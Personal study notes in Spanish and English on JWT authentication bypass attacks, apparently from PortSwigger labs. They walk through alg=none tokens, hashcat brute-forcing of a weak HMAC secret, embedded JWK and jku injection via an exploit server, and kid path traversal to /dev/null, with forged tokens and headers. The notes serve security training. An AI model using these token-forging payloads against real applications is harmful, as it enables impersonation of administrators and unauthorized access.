![[Pasted image 20260804145023.png]]
- Cada parte de esa informacion va separada por puntos '.'

- Los algoritmos de cifrado HS256, HS384 y HS512 son algoritmos **SIMÉTRICOS**, esto quiere decir que con la misma clave se puede tanto FIRMAR como VERIFICAR.
- Algoritmos **ASIMÉTRICOS** como RS256 se FIRMA con la clave PRIVADA, y se VERIFICA con la clave PUBLICA.


1. Cambiar el nombre del usuario en el JWT al del usuario deseado ya que no se valida con la firma:
	- ENCABEZADO:![[Pasted image 20260804145234.png|642]]
	- PAYLOAD:![[Pasted image 20260804145314.png]]
	- FIRMA:![[Pasted image 20260804145336.png]]

2. El servidor acepta JWT's sin firmar, por lo que eliminamos la parte 3 (firma) HASTA DESPUES DEL PUNTO!! y cambiamos en el Header el 'alg' a 'none':

![[Pasted image 20260804150004.png|549]]

3. Le hacemos fuerza bruta a la secret key con hashcat usando el diccionario de burpsuite:
![[Pasted image 20260804151100.png]]
	- Y nos sale que la clave en texto plano es 'secret1':![[Pasted image 20260804151151.png]]
	- La codificamos en Base64 y la sustituimos por la k (clave) en wl JWT Editor:![[Pasted image 20260804151611.png|165]]![[Pasted image 20260804151644.png|357]]
	- Y ahora firmamos el JWT creado con 'administrator' con nuestra key del paso anterior:![[Pasted image 20260804151949.png|250]]![[Pasted image 20260804152019.png|341]]

4. JWK Header Injection:
	- Se puede introducir una JWK (Json Web Key) embebida en la solicitud creando una private key propia en la que nuestro servidor confía:![[Pasted image 20260804162851.png|373]]![[Pasted image 20260804162618.png|238]]


5. JKU Header Injection:
	- JWK Set URL --> https://.....(JWK Set). Nos creamos una clave RSA y copiamos la Public Key en nuestro exploit server en una lista de 'keys[]":![[Pasted image 20260804163638.png|524]]![[Pasted image 20260804164354.png|642]]
	- Añadimos el JKU en la cabecera del JWT:![[Pasted image 20260804164429.png]]
	- Al enviar la petición, la aplicación lee la cabecera `jku` y hace una consulta a nuestro exploit server para descargar la clave pública (buscando el `kid` que coincida). Como el servidor es vulnerable y confía en esa URL externa, utiliza nuestra clave pública para VERIFICAR la firma del JWT. Como nosotros previamente firmamos el JWT con nuestra propia clave privada, la verificación es exitosa y el servidor acepta nuestro token falsificado.


6. KID Header Path Traversal:
	- El laboratorio usa algo asi para leer las claves:![[Pasted image 20260804165955.png|403]]
	- Entonces, creamos una ``Symmetric Key`` (misma clave para firmar y verificar) cuya valor (k) sea un Byte Nulo en Base64 (`AA==`):
	  ![[Pasted image 20260804165501.png|402]]
	-  Retrocedemos el KID hasta /dev/null, y como hemos firmado con un byte nulo, pasamos:![[Pasted image 20260804165720.png|453]]![[Pasted image 20260804165831.png|449]]


---


```
Alg = None
Take the first part and update alg to none, the second part update the admin, and delete the last block, leave the point:
eyJraWQiOiI5ZWVjYjdjMS04MWQ0LTQ0NDQtYmIzZC1kMzkzY2IzN2QxOTciLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE3MDczNDU4NDh9.

Weak key
Common wordlist of secrets: https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list

Jwt self signed JWK header supported (Burp Pro detects this - scan only JWT)
-> Install JWT Editor extension
-> Generate RSA key in extension
-> In repeater jwt tab change value to administrator, then select attack with embedded JWK

JWT arbitrary jku header supported (Burp Pro detects this)
-> Right click on RSA key generated with JWT Editor extension, "copy public key as JWK" and paste it on exploit server inside     { "keys" : []} 
It should look like this:
{ "keys" : [{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "265576ea-fc45-42c8-a21c-5a921c4f37c5",
    "n": "rvYHMqN9Mlgl1wMoXS9y_h6f2zyJMrjBAOI8bs7bzbre1zcVmjbjeF7tYrdCREFKbjby2SSz9hAyPzwhCcwdjH-ITlHfgIn9Avrao9Y6nu801WaQPzvlGBFxgUD3JGsFBxICqNtfJ4h2BLzX1qGJjLdmMqISBXivfpGl4C6vaucsXUmHkK-skpHLdW7PEjZFgP84pGiXKE3lnI0ZMqy0kF_xquJ4A_nv2ehPZvefu9PM9upGoxwmafDDPgwKOEjmYQx1s7Gs7JA4C3TTnPlL378qe4zWeQQ0bc0cAybHCjvzHJtEz1GIY0GRi7iQIE1IprETlIKXaBfV1B_3qqQniQ"
}]}
-> In repeater tab change the kid value for the one on the exploit server, and add a jku header pointing there
{  
    "kid": "265576ea-fc45-42c8-a21c-5a921c4f37c5",  
    "alg": "RS256",  
    "jku": "https://exploit-0a0400f00351e0ac8273837b0178003e.exploit-server.net/exploit"  
}
Change username to admin, sign, and send


JWT authentication bypass via kid header via path traversal
-> Generate New Symetric Key With JWT Editor Extension
-> Replace in the key the "k" value for AA== (null byte)
-> In Repeater change value to administrator, attack with embedded jwk
-> Change first kid value to ../../../../../../../dev/null
{  
    "kid": "../../../../../../../dev/null",  
    "typ": "JWT",  
    "alg": "HS256",  
    "jwk": {  
        "kty": "oct",  
        "kid": "14cfb250-8cdd-4f99-bd47-813983be72d8",  
        "k": "AA=="  
    }  
}
-> Sign & send
```
##### Edit in Burpsuite
Take the second part of the jwt which is user data
![[Pasted image 20240207222524.png]]
Apply the changes on the inpsector
Or use JWT editor extension

##### Set alg to none
Take the first part and update alg to none, the second part update the admin, and delete the last block, leave the point:
```
eyJraWQiOiI5ZWVjYjdjMS04MWQ0LTQ0NDQtYmIzZC1kMzkzY2IzN2QxOTciLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE3MDczNDU4NDh9.
```


##### Brute force JWT secrets
`hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list (rockyou.txt`
```
eyJraWQiOiJmYzExMWMyNy00OGY1LTRiNTgtYjhmZC01ZWE3YzgxODdkZjQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTcwNzM5MDgxNH0.f_ExiMc63Kt203UHu6jrRSTGt6tQ86hKCgIM9s8Bh4U:secret1
```
Forge again in jwt.io
![[Pasted image 20240208111530.png]]


##### Change verify signature
With jet key editor extension go to the right top tab, generate RSA key, then go back to the repeater web token tab, attack with embedded key

##### Injecting a key in the jku
![[Pasted image 20240208122624.png]]
On the exploit server inside of brackets { "keys" : []} copy public key as JWK of the RSA key generated
- Change the kid in the repeater for the one of the public key
- Change username to admin
- Add jku with value exploit server
- sign request
- send

##### JWT # authentication bypass via kid header via path traversal
- **New Symmetric Key**.
- In the dialog, click **Generate** to generate a new key in JWK format. Note that you don't need to select a key size as this will automatically be updated later.
- Replace the generated value for the `k` property with a Base64-encoded null byte (`AA==`). Note that this is just a workaround because the JWT Editor extension won't allow you to sign tokens using an empty string.
- Click **OK** to save the key.
- In the header of the JWT, change the value of the `kid` parameter to a path traversal sequence pointing to the `/dev/null` file:
    `../../../../../../../dev/null`
- In the JWT payload, change the value of the `sub` claim to `administrator` 
- At the bottom of the tab, click **Sign**, then select the symmetric key that you generated in the previous section.
